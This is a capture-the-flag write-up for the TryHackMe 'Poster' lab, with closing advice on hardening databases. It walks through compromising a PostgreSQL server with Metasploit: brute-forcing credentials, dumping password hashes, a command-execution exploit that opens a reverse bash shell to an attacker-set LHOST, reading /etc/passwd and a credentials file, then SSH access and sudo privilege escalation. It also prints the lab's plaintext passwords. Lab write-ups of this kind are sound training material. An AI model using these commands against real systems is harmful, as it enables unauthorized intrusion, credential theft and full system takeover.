---
title: "Challenges: Poster (TryHackMe)"
datePublished: Fri Aug 08 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmevdlvnq000d02l7frab0fkv
slug: challenges-poster-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756383796266/8054b357-6162-404b-b5e9-33a5e0df2571.png
tags: postgresql, rdbms, tryhackme, metasploit, ctf-writeup

---

Relational Database Management Systems (RDBMS) are the backbone of modern data-driven applications. Unlike flat-file or hierarchical systems, an RDBMS structures information into tables linked by relationships, enabling fast queries, efficient storage, and scalable data management. Most use **SQL** to perform essential CRUD operations (Create, Read, Update, Delete), making them both powerful and versatile.

In this challenge, we explore a PostgreSQL RDBMS running on a target machine. By leveraging reconnaissance, enumeration, and exploitation techniques with **Metasploit**, we uncover credentials, interact with the database, extract sensitive information, and escalate privileges to gain full control of the system.

## ***What is rdbms?***

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.

**Are you able to complete the challenge?**

The machine may take up to 5 minutes to boot and configure

## Answer the questions below

### What is the rdbms installed on the server?

### What port is the rdbms running on?

`nmap -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756374745416/b5dce69f-010d-4a9a-804d-000ecba5a174.png align="center")

### Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information.

`msfconsole`

msf6 &gt; `search postgresql auth`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756374772721/84b7e6f5-0c7d-4be3-9811-e375121d8144.png align="center")

### After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

msf6 auxiliary(scanner/postgres/postgres\_login) &gt; `show options`

`set RHOSTS 10.10.94.92` # &lt;-- change to your target IP

`set USER_FILE /opt/metasploit-framework/data/wordlists/postgres_default_user.txt`

`set PASS_FILE /opt/metasploit-framework/data/wordlists/postgres_default_pass.txt`

`set BRUTEFORCE_SPEED 5`

`set STOP_ON_SUCCESS true`

`run`

`ls /opt/metasploit-framework/embedded/framework/data/wordlists/ | grep postgres`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756374796567/ee7dcd29-9fb4-456d-9271-51bdbd0ed714.png align="center")

### What are the credentials you found?  
  
example: user:password

postgres:password

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756374837522/0c8029d2-f4ff-463d-8d6b-ff0f00c67f06.png align="center")

### What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?

`back`

`search postgres credentials`

`auxiliary/admin/postgres/postgres_sql`

`use 2`

`show options`

`set RHOSTS 10.10.94.92`

`set USERNAME postgres`

`set PASSWORD password`

`set DATABASE postgres`

`set SQL 'select version()'`

`run`

### Based on the results of #6, what is the rdbms version installed on the server?

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756374858316/2f494954-5bf5-4971-824a-cf29a646c67e.png align="center")

`set RHOSTS 10.10.94.92`

`set USERNAME postgres`

`set PASSWORD password`

`set DATABASE postgres`

`run`

### What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756383533373/8571d766-4592-42ca-b65f-95c18988c54d.png align="center")

### How many user hashes does the module dump? 6

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756374888174/6c51b92c-72a8-4ee1-aab6-faa4182ecbb6.png align="center")

### What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

`use exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

`show options`

`set RHOSTS 10.10.51.104`

`set USERNAME postgres`

`set PASSWORD password`

`set DATABASE postgres`

`set LHOST 10.10.77.94`

`set LPORT 4444`

`exploit`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756374933405/3175659a-787e-4193-abc8-7cf27b9e9f49.png align="center")

### What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?

`set payload cmd/unix/reverse_bash`

*msf6 &gt;* `use auxiliary/admin/postgres/postgres_readfile`

`set RHOSTS 10.10.51.104`

`set USERNAME postgres`

`set PASSWORD password`

`set DATABASE postgres`

`set RFILE /etc/passwd`

`run`

```bash
[*] Running module against 10.10.51.104
Query Text: 'CREATE TEMP TABLE cJqoVshYCzTDSy (INPUT TEXT);
COPY cJqoVshYCzTDSy FROM '/etc/passwd';
SELECT * FROM cJqoVshYCzTDSy'

input

#/home/dark/credentials.txt _apt:x:105:65534::/nonexistent:/bin/false alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin dark:x:1001:1001::/home/dark: games:x:5:60:games:/usr/games:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/ gnats:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nolo gin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin messagebus:x:106:110::/var/run/dbus:/bin/false news:x:9:9:news:/var/spool/news:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/po stgresql:/bin/bash proxy:x:13:13:proxy:/bin:/usr/sbin/nologin root:x:0:0:root:/root:/bin/bash sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync sys:x:3:3:sys:/dev:/usr/sbin/nologin syslog:x:104:108::/home/syslog:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/syst emd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/r un/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd /resolve:/bin/false systemd-timesync:x:100:102:systemd Time Synchronization,,, :/run/systemd:/bin/false uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin uuidd:x:107:111::/run/uuidd:/bin/false www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

```bash

#/home/dark/credentials.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
[+] 10.10.51.104:5432 Postgres - /etc/passwd saved in /root/.msf4/loot/20250805103411_default_10.10.51.104_postgres.file_954695.txt
[*] Auxiliary module execution completed
```

`set RFILE /home/dark/credentials.txt`

`run`

```bash
run
[*] Running module against 10.10.51.104
Query Text: 'CREATE TEMP TABLE AjVkyJeqvzFfvf (INPUT TEXT);
      COPY AjVkyJeqvzFfvf FROM '/home/dark/credentials.txt';
      SELECT * FROM AjVkyJeqvzFfvf'
============================================================================================================================================================

    input
    -----
    dark:qwerty1234#!hackme

dark:qwerty1234#!hackme
[+] 10.10.51.104:5432 Postgres - /home/dark/credentials.txt saved in /root/.msf4/loot/20250805103941_default_10.10.51.104_postgres.file_663027.txt
[*] Auxiliary module execution completed
msf6 auxiliary(admin/postgres/postgres_readfile) >
```

`ssh dark@IP_Address`

`whoami`

`ls -la`

`find / -type f -name user.txt 2> /dev/null`

`cat /home/alison/user.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756375030434/b6ce9b2c-64e0-493a-bbc4-9c56289dd538.png align="center")

```sql
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>$
```

`su alison`

`find / -type f -name user.txt 2> /dev/null`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756375352994/32d603cd-c878-4506-9bf6-e65d74efb694.png align="center")

### Escalate privileges and obtain root.txt

`sudo -l`

`sudo su -`

`find / -type f -name root.txt 2> /dev/null`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756375382033/2edb09e3-85ea-41e8-893e-7d0284fee523.png align="center")

This walkthrough highlights how misconfigured or weakly secured RDBMS instances can expose critical vulnerabilities. By combining **service enumeration**, **Metasploit modules**, and **credential reuse**, we were able to extract database information, pivot into system access, and ultimately escalate privileges to obtain the coveted `root.txt` flag.

The exercise reinforces an important lesson:

* Secure your database services with strong, non-default credentials.
    
* Limit exposure of RDBMS ports to trusted networks.
    
* Regularly audit permissions to prevent privilege escalation.
    

Ultimately, the challenge demonstrates how an attacker can move from a single exposed RDBMS service to complete system compromise.

---